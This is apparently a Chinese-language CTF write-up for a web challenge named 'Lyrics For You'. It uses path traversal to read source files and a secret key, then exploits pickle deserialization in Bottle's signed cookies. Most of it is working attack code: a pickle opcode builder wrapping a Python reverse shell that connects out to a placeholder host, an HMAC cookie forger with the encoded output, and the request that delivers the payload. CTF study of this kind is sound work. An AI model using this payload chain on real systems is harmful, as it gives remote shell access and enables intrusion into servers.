# Lyrics For You
	- 到`/lyrics`读`../app.py`拿到源码
	- 看到还有`cookie`模块，读`../cookie.py`拿到源码
	- 提示`Quoted from python bottle template`，应该是[[CTFWEB/Bottle]]框架的东西，应该是打[[CTFWEB/Python/Pickle]]反序列化
	- 尝试读`secret_code`，读`../config/secret_key.py`拿到
		- ```python
		  secret_code = "EnjoyThePlayTime123456"
		  ```
	- 搓一个pickle反序列化payload
		- ```python
		  cmd = """
		  export HOST="xxxxx";export POT=4051;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("HOST"),int(os.getenv("POT"))));[os.dup2(getattr(s, "fi""leno")(),fd) for fd in (0,1,2)];pty.spawn("sh")'
		  """
		  
		  # https://github.com/python/cpython/blob/3.12/Lib/pickletools.py#L1420
		  
		  import typing as t
		  
		  PickleOpcode = bytes
		  
		  
		  def add_pickle_header(opcodes: PickleOpcode) -> PickleOpcode:
		      return b"\x80\x04\x95" + len(opcodes).to_bytes(8, "little") + opcodes
		  
		  
		  def pickle_string(pickle_type, value: str) -> PickleOpcode:
		      if pickle_type == "STRING":
		          return b"S" + value.encode() + b"\n"
		      if pickle_type == "SHORT_BINSTRING":
		          return b"U" + len(value).to_bytes(1, "little") + value.encode()
		      if pickle_type == "BINSTRING":
		          return b"T" + len(value).to_bytes(4, "little") + value.encode()
		      if pickle_type == "UNICODE":
		          return b"V" + value.encode() + b"\n"
		      if pickle_type == "SHORT_BINUNICODE":
		          return b"\x8c" + len(value).to_bytes(1, "little") + value.encode()
		      if pickle_type == "BINUNICODE":
		          return b"X" + len(value).to_bytes(4, "little") + value.encode()
		      else:
		          raise NotImplementedError(f"{pickle_type=} is not supported.")
		  
		  
		  def pickle_inst(
		      arguments: t.Iterable[PickleOpcode], module: str, clazz: str
		  ) -> PickleOpcode:
		  
		      return (
		          b"("
		          + b"".join(arguments)
		          + b"i"
		          + module.encode()
		          + b"\n"
		          + clazz.encode()
		          + b"\n"
		      )
		  
		  
		  opcode = pickle_inst([pickle_string("BINSTRING", cmd)], "os", "system") + b"."
		  opcode += b"."
		  opcode = add_pickle_header(opcode)  # 可加可不加
		  print(opcode)
		  # b'\x80\x04\x95\xee\x00\x00\x00\x00\x00\x00\x00(T\xdb\x00\x00\x00\nexport HOST="xxxxx";export POT=4051;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("HOST"),int(os.getenv("POT"))));[os.dup2(getattr(s, "fi""leno")(),fd) for fd in (0,1,2)];pty.spawn("sh")\'\nios\nsystem\n..'
		  
		  ```
	- 然后塞进cookie里
		- ```python
		  import base64
		  import hmac
		  
		  
		  def tob(s: str):
		      return s.encode("utf-8")
		  
		  
		  # data = pickle.dumps({"username": "114514"}, -1)
		  data = opcode
		  key = "EnjoyThePlayTime123456"
		  msg = base64.b64encode(data)
		  sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
		  payload = tob("!") + sig + tob("?") + msg
		  print(payload)
		  # b'!mtC0S0Z74jJKwYagUmxHhQ==?gASV7gAAAAAAAAAoVNsAAAAKZXhwb3J0IEhPU1Q9Inh4eHh4IjtleHBvcnQgUE9UPTQwNTE7cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJIT1NUIiksaW50KG9zLmdldGVudigiUE9UIikpKSk7W29zLmR1cDIoZ2V0YXR0cihzLCAiZmkiImxlbm8iKSgpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJwppb3MKc3lzdGVtCi4u'
		  
		  ```
	- 最后打上去就能拿到反弹shell
		- ```python
		  r = requests.get(url + "/board", data = {
		      "username": "114514"
		  }, cookies = {
		      "user": payload.decode()
		  })
		  ```